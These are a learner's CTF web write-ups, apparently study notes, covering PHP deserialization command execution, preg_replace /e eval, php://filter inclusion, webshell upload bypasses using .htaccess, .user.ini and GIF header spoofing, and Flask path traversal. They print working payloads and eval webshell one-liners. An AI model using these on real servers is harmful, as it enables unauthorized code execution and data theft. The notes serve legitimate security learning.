拿到题目有点蒙，不知道该干嘛，页面一直在刷新，看源码发现有时区问题

用dirsearch扫不了，用burp抓包查找

![image-20250220155136113](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220152609270.png)

发现有两个参数，一开始不知道怎么改，尝试改时区

![image-20250220152836495](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220152703494.png)

发现utc会变，但是不知道怎么往下走了，于是查了wp

发现前面那个方法可以自己修改，并且会执行

![image-20250210100426799](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220152836495.png)

显示出了123的md5值

![image-20250220152609270](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220153551505.png)

使用ls查发现被过滤了

这里查找源代码进行审计

> 可以使用多种函数进行查看，例如：**file_get_contents()** ，**highlight_file()** ，**show_source()**

使用file_get_contents读取

```
func=file_get_contents&p=index.php
```

```php
   <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```

审计发现有一段代码

```php
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
```

应该是使用序列化来绕过过滤

```php
<?php
class Test {
    var $p = "ls";
    var $func = "System";
  
}
$a = new Test();
$s = serialize($a);
echo $s;

?>

```

构造payload

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"System";}
```

![image-20250220153551505](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220154946464.png)

![image-20250209201116734](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220150332103.png)

成功读取到了文件，然后使用find查找

```
find / -name flag*
```

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"System";}
```

![image-20250220155059338](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220155059338.png)

再使用cat读取

```
func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"System";}
```

获得flag

![image-20250203133353606](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220155136113.png)

#### [BJDCTF2020]ZJCTF，不过如此

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

看到`file_get_contents`，还是使用`data`伪协议写入内容

```
?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

得到next.php的内容

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```

这里最重要的是**preg_replace**

> ```php
> preg_replace($pattern, $replacement, $subject, $limit, $count);
> ```
>
> pattern：正则表达式
> replacement：用于替换匹配部分的字符串或回调函数
> subject：需要进行替换的字符串或数组
> limit：（可选）限制替换的次数
> count：（可选）存储替换的次数
>
> ```php
> preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str);
> ```
>
> 这里的`/e`会出现漏洞，使`preg_replace`将`replacement`参数里的内容当作php代码求值并执行
>
> 这里的`replacement`参数是`strtolower("\\1")`，会将匹配的内容替换成小写
>
> * 反向引用
>   对一个正则表达式模式两边添加**圆括号**将导致相关匹配存储到一个临时缓冲区，每个子匹配都按照正则表达式中从左到右的顺序存储，编号从1开始，每个缓冲区都可以使用`\n`访问
>
> 所以这里的`'/(' . $re . ')/ei'`，就会触发缓冲区，然后被`strtolower("\\1")`的`\1`匹配到，然后被/e执行

这里foreach函数将传入的参数修改为array形式，然后将数据传入complex中

> ```php
> foreach (iterable_expression as $key => $value)
> ```
>
> `foreach`会将数组赋值，把值赋给value，键名赋值给key

```
?.*=phpinfo()
变成
$_GET = array(
    ".*" => "phpinfo()"
);

complex(".*", "phpinfo()");

preg_replace('/(.*)/ei', 'strtolower("\\1")', 'phpinfo()');
```

`(.*)`是一个任意匹配字符，并将匹配的内容放入缓冲区

```
next.php?.*={${phpinfo()}}
```

但是这样不行，因为php会将非法的参数名转换成下划线，就会失效

所以修改成

```
next.php?\S*=${getflag()}&cmd=system('cat /flag');
```

因为**`\S`** 代表 **匹配非空白字符**和`(.*)`很相似，就用这个替换，触发getflag{}，就可以使用cmd执行代码了

#### [SWPUCTF 2021 新生赛]jicao

```php
<?php
highlight_file('index.php');
include("flag.php");
$id=$_POST['id'];
$json=json_decode($_GET['json'],true);
if ($id=="wllmNB"&&$json['x']=="wllm")
{echo $flag;}
?>
```

很简单的传参，就把json和id传入就行

`json_decode`是对json格式解码，变为php变量

![](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250225151042871.png)

#### [鹤城杯 2021]EasyP

```php
<?php
include 'utils.php';

if (isset($_POST['guess'])) {
    $guess = (string) $_POST['guess'];
    if ($guess === $secret) {
        $message = 'Congratulations! The flag is: ' . $flag;
    } else {
        $message = 'Wrong. Try Again';
    }
}

if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
    exit("hacker :)");
}

if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){
    exit("hacker :)");
}

if (isset($_GET['show_source'])) {
    highlight_file(basename($_SERVER['PHP_SELF']));
    exit();
}else{
    show_source(__FILE__);
}
?> 
```

看到好多不认识的函数，正好刚搞了phpstudy，用来尝试一下

![image-20250326195131053](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250326195131053.png)

可以看到`REQUEST_URI`，会将访问页面后的所有数据

#### [NCTF 2018]Easy_Audit

这题学到很多

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if($_REQUEST){
    foreach ($_REQUEST as $key => $value) {
        if(preg_match('/[a-zA-Z]/i', $value))   die('waf..');
    }
}

if($_SERVER){
    if(preg_match('/yulige|flag|nctf/i', $_SERVER['QUERY_STRING']))  die('waf..');
}

if(isset($_GET['yulige'])){
    if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige']))){         //日爆md5!!!!!!
        die('waf..');
    }else{
        if(preg_match('/nctfisfun$/', $_GET['nctf']) && $_GET['nctf'] !== 'nctfisfun'){
            $getflag = file_get_contents($_GET['flag']);
        }
        if(isset($getflag) && $getflag === 'ccc_liubi'){
            include 'flag.php';
            echo $flag;
        }else die('waf..');
    }
}
?>
```

一段段来

`$_REQUEST` 的特性是会接受 `$_GET` `$_POST` `$_COOKIE` 的值，但是post方法的值的优先级会高于get，如果get和post传了名字相同的传输，就会先读post的

```php
if($_REQUEST){
    foreach ($_REQUEST as $key => $value) {
        if(preg_match('/[a-zA-Z]/i', $value))   die('waf..');
    }
}
```

`$_SERVER` 的特性是不会对传输进行urldecode，但是get方法可以，所以用urlencode就可以绕过

```php
if($_SERVER){
    if(preg_match('/yulige|flag|nctf/i', $_SERVER['QUERY_STRING']))  die('waf..');
}
```

这个用数组绕过

```php
if(isset($_GET['yulige'])){
    if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige']))){         //日爆md5!!!!!!
        die('waf..');
    }
```

这个正则匹配的是以这个字符串结尾就行，所以只要在前面赛点东西就可以，getflag用data伪协议就行

```php
if(preg_match('/nctfisfun$/', $_GET['nctf']) && $_GET['nctf'] !== 'nctfisfun'){
            $getflag = file_get_contents($_GET['flag']);
        }
```

```
get：yulige[]=1&nctf=3nctfisfun&flag=data://text/plain,ccc_liubi
post：yulige=1&nctf=1&flag=1
```

最后的payload

```
get：%79%75%6c%69%67%65[]=1&%6e%63%74%66=%31%6e%63%74%66%69%73%66%75%6e&%66%6c%61%67=data://text/plain,ccc_liubi
post：yulige=1&nctf=1&flag=1
```

## 文件包含

#### [极客大挑战 2019]Secret File

打开页面，f12查看发现有一个Archive_room.php，点击跳到页面，点击select，又跳到了一个end.php的页面，查看源码发现中间还有一个action.php用burp抓包，看到是有一个secr3t.php，查看一下

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];          // 这个是从url参数file中获取输入
    if(strstr($file,"../")||stristr($file,  "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }                             // 这个是过滤敏感字符
    include($file); 
//flag放在了flag.php里
?>

```

发现这是一个文件包含，直接查看没有东西，这个又是一个文件包含，所以用伪协议查看，构造payload

```
secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

成功得到flag

#### [ACTF2020 新生赛]Include

点击tips发现url变成了

```url
http://3f53e640-cdc3-4777-a0e6-140ba4930aff.node5.buuoj.cn:81/?file=flag.php
```

后面的file=flag.php存在文件包含，所以flag应该会在这个文件当中，但是没有，所以可能flag会在这个的源码里，就可以用伪协议来查看源代码

```url
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

获取加密后的源代码

```
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MGM1MWNmZDYtODY4Yy00YWQ2LWE1ZjEtMTA3YjBiODAwMTUyfQo=
```

base64解码后得到flag

#### [HCTF 2018]WarmUp

f12看到有一个source.php，一开始不知道怎么打开orz，直接在最网址最后加上`/soucre.php`

就可以在网页上查看到对应的php，主要的是这一段

```php
<?php
    highlight_file(__FILE__);
    //定义了一个emmm类
	class emmm
    {
        
        //这里是设置了一个白名单，提示我们要找hint.php
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            //检查page是不是字符串
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
			//白名单检查
            if (in_array($page, $whitelist)) {
                return true;
            }
			//去掉查询字符串
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
		   //解码后再次去掉查询字符串
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            //检查白名单
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
// 如果通过这个检查，就会包含flag的文件，从请求中拿到flie数据
    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

根据ai看了一下代码没看太懂，反正知道要找hint.php，得到了

```
flag not here, and flag in ffffllllaaaagggg
```

最后还是要看这个php代码，因为需要的是最后的包含文件，要进入emm类检查，构造payload

```
source.php?file=source.php?/../../../../ffffllllaaaagggg
```

因为在这里的白名单检查只检查?之前的，所以后面的flag可以进入，include得到的file数据就是`source.php?/../../../../ffffllllaaaagggg`，include会解析？后面的数据，访问到这个文件

#### [BSidesCF 2020]Had a bad day

点击页面两个选项出现了图片，url出现了一个category的参数，尝试修改为1，不行，加个'号，出现报错

发现`include()`，猜测是文件包含，尝试使用`php://filter`读取，这里可以发现后面多了一个`.php`所以查询的时候就不用加了

```
?category=php://filter/read=convert.base64-encode/resource=index
```

解码后获取源代码

```php
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Images that spark joy">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Had a bad day?</title>
    <link rel="stylesheet" href="css/material.min.css">
    <link rel="stylesheet" href="css/style.css">
  </head>
  <body>
    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Had a bad day?</span>
          <div class="mdl-layout-spacer"></div>
        <div>
      </header>
      <div class="page-ribbon"></div>
      <main class="page-main mdl-layout__content">
        <div class="page-container mdl-grid">
          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
            <div class="page-crumbs mdl-color-text--grey-500">
            </div>
            <h3>Cheer up!</h3>
              <p>
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              </p>
              <div class="page-include">
              <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
			</div>
          <form action="index.php" method="get" id="choice">
              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
          </form>

          </div>
        </div>
      </main>
    </div>
    <script src="js/material.min.js"></script>
  </body>
</html>
```

可以发现必须要包含woofers、meowers或index，所以直接查询flag是不行的

所以要加上一个参数

```
?category=php://filter/woofers/read=convert.base64-encode/resource=flag
```

> php在解析url伪协议时
>
> 1. 检查类似php://filter关键字，确认是一个伪协议
> 2. 然后就会查找read=或write=等参数，不会在意额外的路径片段

#### [鹏城杯 2022]简单包含

```php
<?php 
highlight_file(__FILE__);
include($_POST["flag"]);
//flag in /var/www/html/flag.php;
```

直接传参，发现出现一个waf，那就尝试读取index.php

```
flag=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php
```

发现waf是因为前面的匹配，但是因为是`&&`所以只要有一个不成立就可以，`php://input`自动读取post的数据，然后判断长度，所以只要传一个很长的参数上去就能绕过

```php
<?php

$path = $_POST["flag"];

if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {
    echo 'nssctf waf!';
} else {
    @include($path);
}
```

最后的payload

```
a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
```

## 文件上传

---

### php

#### [极客大挑战 2019]Upload

是一道和文件上传有关的题目，看来一圈没发现东西，传图片也传不上去

上网查文件上传，尝试提交一个一句话木马

```php
<?php @eval($_POST['1234'])?>
```

还是文件类型的问题，发现网上有些不同的后缀，试了发现都不行orz

```
*.php *.php3 *.php4 *.php5 *.phtml *.pht
```

查wp发现要修改文件的类型，在burp中抓包修改，将类型修改为`image/jpeg`

![image-20250201124618195](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250201124618195.png)

然后再尝试不同的后缀

最后使用`.phtml`成功（这个文件就是嵌入了php脚本的html页面），但是网站还有过滤

![image-20250201124821159](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250201124821159.png)

查到使用js去绕过

```js
<script language="php">eval($_REQUEST[1234])</script>
```

这个`REQUEST`方法会接收GET、POST或cookie传递的参数，这个东西传入后，使用蚁剑，配置访问地址（文件位置的url），和密码（webshell的参数名），蚁剑就会向shell发送请求，web shell接收到后就会执行

![image-20250201130135354](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250201125131803.png)

但是直接传不行，学到了可以在文件开头加上`GIF89a?`来伪造，成功上传

```
GIF89a?
<script language="php">eval($_REQUEST[1234])</script>
```

然后是要找文件的保存路径，这个应该是做题的经验，去找upload

![image-20250201125315393](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250201125315393.png)

确实找到了，然后就要用蚁剑连接（还是第一次用orz

![image-20250201125131803](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250201130029324.png)

连接`/upload/filename`，密码就是之前传上去的

然后就在里面找,成功在根目录找到

![image-20250201130029324](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250201130135354.png)

#### [极客大挑战 2019]Knife

也是使用蚁剑的题，一开始看到有个一句话木马

```
eval($_POST["Syc"]);
```

然后就猜测是用蚁剑去连接，尝试成功，在根目录找到flag

#### [ACTF2020 新生赛]Upload

上传文件，限制了只能传图片，传了一张图片，抓包

![image-20250202114417733](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250209100945429.png)

成功传了上去，也发现了文件的位置，尝试用蚁剑连接，发现无法连接，应该是后缀的问题，修改成php无法上传，就尝试不同的后缀，最后phtml可以上传，用蚁剑成功获取flag

还在网上找wp发现一个删除前端js代码来上传文件的，找到一个**NoScript**的拓展，就可以绕过前端的限制，直接上传

![image-20250211114406285](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250202114944198.png)

![image-20250202114944198](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250202114417733.png)

最后总结是这道题有两个限制，一个是前端限制图片的上传，还有一个是后端限制php等的限制，前端可以用禁用js或者抓包来绕过，后端就是用phtml文件类型来绕过

#### [MRCTF2020]你传你🐎呢

文件上传，打开burp抓包上传文件，传了一个phtml文件不行，修改后缀和Content-Type头，可以上传了，还有文件路径

![image-20250209100945429](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250209102608770.png)

但是文件后缀被修改了无法用蚁剑连接，这里就不知道怎么绕过了，查wp发现了.htaccess解析漏洞
[【文件上传绕过】四、.htaccess文件解析漏洞_htaccess文件上传漏洞,htaccess文件内容-CSDN博客](https://blog.csdn.net/weixin_44032232/article/details/108998564)

`.htaccess`文件，全称是Hypertext Access（超文本入口），是Apache服务器中的一个配置文件，这个文件可以针对目录改变配置，实现改变文件拓展名、允许/阻止特点用户的访问、禁止目录列表等功能，在一个文档的目录中存放一个包含一或多个指令的文件，可以修改这个目录及其子目录
`.htaccess`文件内容

第一种：针对所有文件的特定类型

```
<IfModule mime_module>
AddHandler php5-script .gif         
#在当前目录下，只针对gif文件会解析成Php代码执行
SetHandler application/x-httpd-php   
#在当前目录下，所有文件都会被解析成php代码执行
</IfModule>
```

第二种：针对特定文件

```
<FilesMatch "文件名.gif">
SetHandler application/x-httpd-php   
#在当前目录下，如果匹配到 文件名.gif 文件，则被解析成PHP代码执行
AddHandler php5-script .gif          
#在当前目录下，如果匹配到 文件名.gif 文件，则被解析成PHP代码执行
</FilesMatch>
```

利用这个题目没有限制`.htaccess`文件的上传

![image-20250209102608770](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250211104450733.png)

然后之前传的文件就可以用蚁剑连接了

#### [GXYCTF2019]BabyUpload

文件上传，一步步尝试

直接传1.phtml，无法上传，提示后缀不能有ph，用burp抓包，修改为1.jpg，提示文件类型太露骨，修改Content-Type: image/jpeg

![image-20250211104450733](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250211113120781.png)

猜测是php的特征，可以用js包裹，网上搜到用js的一句话木马

```js
<script language="php">eval($_POST['marin']);</script>
```

成功上传，然后就是传`.haccess`文件

```
<FilesMatch "1.jpg">
setHandler application/x-httpd-php
AddHandler application/x-httpd-php .jpg
</FilesMatch>
```

成功用蚁剑连接

#### [SUCTF 2019]CheckIn

一开始还是跟着文件上传常规走，传php，限制有文件后缀，文件类型，php语法，和文件头，最后用这个上传成功

```
GIF89a?
<script language="php">eval($_POST['marin']);</script>
```

![image-20250211113120781](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250211113454519.png)

然后想要继续用.htaccess文件，但是因为文件头的限制，传进去了也没有用

然后就卡住了，查了wp，学了一个新东西

> .user.ini
>
> 在php中php.ini是默认的配置文件，会配置一些模式
>
> ![image-20250211113454519](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250211114406285.png)
>
> 在这其中除了INI_SYSTEM不能被配置，都可以.user.ini中配置
>
> 在php中，支持每个目录有自己的INI文件配置，除了主php.ini之外，PHP会扫描每个目录下的INI文件，从执行的PHP文件开始，一直向上直到web根目录，如果执行的PHP文件在web根目录之外，就只扫描这个目录
>
> ![](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250211114117971.png)
>
> 这个.user.ini其实就是用户自定义的php.ini，并且这个文件是能够动态加载的，只要我上传之后，等待user_ini.cache_ttl设置的时间，就会被重新加载
>
> 在这个中很多敏感的配置都修改不了，但是有两个可以用的**`auto_append_file`​**和**​`auto_prepend_file`**
>
> **​`auto_append_file`​**：在 PHP 脚本执行后，自动包含指定的文件（include）
> 使用方法：
>
> ```
> auto_append_file=01.jpg
> ```
>
> **​`auto_prepend_file`​**：在 PHP 脚本执行前，自动包含指定的文件（include）
> 使用方法：
>
> ```
> auto_prepend_file=01.jpg
> ```
>
> * 上传.user.ini文件的条件
>
> 1. 服务器语言为php
> 2. 对应目录下要有可执行的php文件

这题就是要传这个.user.ini文件，修改auto_prepend_file配置

```
GIF89a?
auto_prepend_file=1.jpg
```

让所有php文件都会包含1.jpg，也就是我们传的木马，所以只要蚁剑连接这里包含的index.php就可以获取到flag

### python

#### [NISACTF 2022]babyupload

这题拿着刚学到的工具看一眼

![image-20250419134148929](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250419134148929.png)

看出来是一个flask框架，看看源码，有一个 `/source` 的提示，下载下来是python源码

```python
from flask import Flask, request, redirect, g, send_from_directory
import sqlite3
import os
import uuid

app = Flask(__name__)

SCHEMA = """CREATE TABLE files (
id text primary key,
path text
);
"""


def db():
    g_db = getattr(g, '_database', None)
    if g_db is None:
        g_db = g._database = sqlite3.connect("database.db")
    return g_db


@app.before_first_request
def setup():
    os.remove("database.db")
    cur = db().cursor()
    cur.executescript(SCHEMA)


@app.route('/')
def hello_world():
    return """<!DOCTYPE html>
<html>
<body>
<form action="/upload" method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="file">
    <input type="submit" value="Upload File" name="submit">
</form>
<!-- /source -->
</body>
</html>"""


@app.route('/source')
def source():
    return send_from_directory(directory="/var/www/html/", path="www.zip", as_attachment=True)


@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return redirect('/')
    file = request.files['file']
    if "." in file.filename:
        return "Bad filename!", 403
    conn = db()
    cur = conn.cursor()
    uid = uuid.uuid4().hex
    try:
        cur.execute("insert into files (id, path) values (?, ?)", (uid, file.filename,))
    except sqlite3.IntegrityError:
        return "Duplicate file"
    conn.commit()

    file.save('uploads/' + file.filename)
    return redirect('/file/' + uid)


@app.route('/file/<id>')
def file(id):
    conn = db()
    cur = conn.cursor()
    cur.execute("select path from files where id=?", (id,))
    res = cur.fetchone()
    if res is None:
        return "File not found", 404

    # print(res[0])

    with open(os.path.join("uploads/", res[0]), "r") as f:
        return f.read()


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

```

上传的文件不能包含 `.` ，然后就没有限制，但是他会创建一个uuid值，然后将文件名和路径以及uuid值放到数据库中，当访问 `/file/uuid` 时，会根据这个uuid去找到对应的文件名以及路径，然后再访问

```python
cur.execute("select path from files where id=?", (id,))
```

这里不像要用文件上传的内容，本来想着用 sql注入，但是这个使用了参数化查询，是将传入的id值传到 ？占位符，即使有恶意代码也会当字符串处理

一开始做就没头绪了orz，很少做python的题，也不知道漏洞点会在哪，看了wp才发现危险的地方是 `os.path.join()`

看python文档

> `os.path.join(path,*paths)`
>
> 将一个或多个路径连接起来，返回值是 `path` 和 `*paths` 中的成员后加一个目录分隔符，不会自动解析 `../`
> 这个的漏洞在于，如果后面的参数是一个绝对路径，就会忽略前面的所有路径，返回绝对路径之后的值

所以这里上传一个绝对路径名

拼接时就会变成 `os.path.join("uploads/", /flag)`，忽略前面的路径，导致访问到flag

![image-20250419135750325](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250419135750325.png)

## HTTP

#### [极客大挑战 2019]Http

查看源码发现了一个Secret.php，点进去发现了提示，使用burp打开

![image-20250201120047072](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250201120059644.png)

![image-20250207100852856](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250201120047072.png)

![image-20250201120113996](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250201120113996.png)

一步步跟着走就行

#### [极客大挑战 2019]BuyFlag

在页面里找到要求

![image-20250201120059644](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250207100852856.png)

要身份验证和密码，最后还要金额

查看源代码

```php
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
```

发现被注释掉的一段，是判断密码password的

> `is_numeric`：使用来判断是不是存数字的，不能输入纯数字
>
> 以为后面是==的弱比较，所以直接传入一个404a就行

使用burp抓包

![image-20250207101433960](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250207101433960.png)

发现cookie参数是user=0，修改为1传入成功修改身份

然后修改password为404a成功，最后就是金额

![image-20250207101551483](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250207101551483.png)

![image-20250208175826893](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250207101757008.png)

直接使用100000000会显示金额过长，这里看的wp使用的是科学计数法，不会导致数字长度太长，但是要大于这个值，所以使用1e9

## flask session伪造

#### [HCTF 2018]admin

这题没想出来怎么做，看的wp
[BUUCTF-[HCTF 2018]admin1_[hctf 2018]admin 1-CSDN博客](https://blog.csdn.net/qq_46918279/article/details/121294915)

有几个做法

先注册一个用户，登录后会发现有一个修改密码的页面，查看源码能发现提示

![image-20250208172443234](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250208172443234.png)

不过这个github的库以及失效了，只能看wp做了

这个会下载页面的源码，第一个做法就是flask session伪造

> flask session伪造：
>
> session是用来保存用户的状态信息的，会保存在响应对象的cookie中，当用户请求一次之后有了session后，第二层请求后就会将session保存在cookie中，网站解析cookie后找到对应的用户信息
>
> flask session有两种存储方法
> 直接存在客户端的cookies中
> 存储在服务端的数据库中
>
> flask的session格式
> 一般由base64加密的`session数据.时间戳.签名`组成的
> 时间戳：告诉服务端数据最后一次更新的时间，超过31的会话会过期
> 签名：利用`Hmac`算法，将session数据和时间戳加上`secret_key`加密得到的，用来保证数据没有被修改
>
